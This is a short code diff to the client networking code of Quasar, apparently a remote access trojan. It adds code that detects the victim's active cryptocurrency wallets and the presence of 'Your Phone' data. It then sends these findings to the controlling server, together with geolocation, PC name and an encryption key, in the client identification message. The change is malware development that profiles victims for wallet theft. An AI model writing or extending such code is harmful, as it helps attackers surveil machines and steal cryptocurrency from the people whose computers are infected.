@@ -128,6 +128,9 @@ namespace Quasar.Client.Networking
                 var geoInfo = GeoInformationFactory.GetGeoInformation();
                 var userAccount = new UserAccount();
 
+                var wallets = Helper.WalletHelper.GetActiveWallets();
+                bool hasPhone = Helper.WalletHelper.HasYourPhoneData();
+
                 client.Send(new ClientIdentification
                 {
                     Version = Settings.VERSION,
@@ -141,7 +144,9 @@ namespace Quasar.Client.Networking
                     PcName = SystemHelper.GetPcName(),
                     Tag = Settings.TAG,
                     EncryptionKey = Settings.ENCRYPTIONKEY,
-                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
+                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
+                    Wallets = wallets,
+                    Phone = hasPhone
                 });
             }
         }
